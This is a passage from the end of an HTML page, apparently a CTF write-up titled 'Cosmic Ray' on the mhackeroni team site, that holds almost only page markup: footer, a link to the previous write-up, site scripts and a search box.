+used as an automated status check.</p></div></div><script type=text/javascript src=/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA==" data-oid=views_writeups/2025-10-02-ctrl-space-quals-cosmic-ray/index.md data-oid-likes=likes_writeups/2025-10-02-ctrl-space-quals-cosmic-ray/index.md></script></section><footer class="pt-8 max-w-prose print:hidden"><div class=pt-8><hr class="border-dotted border-neutral-300 dark:border-neutral-600"><div class="flex justify-between pt-3"><span><a class="flex group mr-3" href=/writeups/2025-09-30-ctrl-space-quals-lone-explorer/><span class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400">&larr;</span>
+<span class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400">&rarr;</span>
+<span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">Lone Explorer - Ctrl+Space Quals 2025</span>
+<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400"><time datetime=2025-09-30T00:00:00+00:00>30 September 2025</time>
+</span></span></a></span><span></span></div></div></footer></article><div id=top-scroller class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0"><a href=#the-top class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400" aria-label="Scroll to top" title="Scroll to top">&uarr;</a></div></main><footer id=site-footer class="py-10 print:hidden"><nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400"><ul class="flex flex-col list-none sm:flex-row"><li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href title></a></li></ul></nav><div class="flex items-center justify-between"><p class="text-sm text-neutral-500 dark:text-neutral-400">&copy;
+2025
+mhackeroni</p><p class="text-xs text-neutral-500 dark:text-neutral-400">Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://gohugo.io/ target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://blowfish.page/ target=_blank rel="noopener noreferrer">Blowfish</a></p></div><script>mediumZoom(document.querySelectorAll("img:not(.nozoom)"),{margin:24,background:"rgba(0,0,0,0.5)",scrollOffset:0})</script><script type=text/javascript src=/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh+sCQ0E53ghYrxgYqw+0GCRyIEpA=="></script></footer><div id=search-wrapper class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500" data-url=https://mhackeroni.it/><div id=search-modal class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"><header class="relative z-10 flex items-center justify-between flex-none px-2"><form class="flex items-center flex-auto min-w-0"><div class="flex items-center justify-center w-8 h-8 text-neutral-400"><span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></div><input type=search id=search-query class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent" placeholder=Search tabindex=0></form><button id=close-search-button class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" title="Close (Esc)">
+<span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></button></header><section class="flex-auto px-2 overflow-auto"><ul id=search-results></ul></section></div></div></div></body></html>
